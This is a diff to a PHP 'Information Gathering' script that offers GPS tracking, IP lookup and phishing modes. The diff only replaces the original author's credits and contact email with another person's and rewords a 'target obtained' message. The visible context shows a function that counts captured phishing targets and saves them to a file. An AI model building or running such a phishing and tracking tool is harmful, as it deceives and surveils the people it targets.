@@ -1,9 +1,9 @@
 <?php 
 /*
-	Author 	: Brilly4n
-	Team 	: { IndoSec }
+	Author 	: Dave4
+	Team 	: { DaveKgw }
 	Tools 	: Information Gathering
-	Fanspage: https://www.facebook.com/IndoSecOfficial
+	Fanspage: https://www.facebook.com/id.profile
 				{ OpenSourceCode }
 */
 
@@ -54,12 +54,12 @@ function tampil($version)
 
        => Information Gathering <=                                        
 
-Author   : Brilly4n - { IndoSec }
-Contact  : timtam.rpl@gmail.com
-FansPage : https://www.facebook.com/IndoSecOfficial/
+Author   : Dave4 - { DaveKgw }
+Contact  : davekoagow@gmail.com
+FansPage : https://www.facebook.com/id.profile/
 
 	--GPS  --IP  --PHISING --exit
- > ";
+ Track ";
 }
 
 function proses($random)
@@ -149,7 +149,7 @@ function buat_phising($opsi, $random, $url)
 				$q = count($o[0]);
 				$r = $q + 1;
 
-				echo " >\n[+] ". $r ." Target Di Dapatkan !\n";
+				echo " >\n[+] ". $r ." Gotcha !\n";
 				echo "[+] Membuat File\n\n";
 				$filesss = "phising_".$random.".txt";
 				
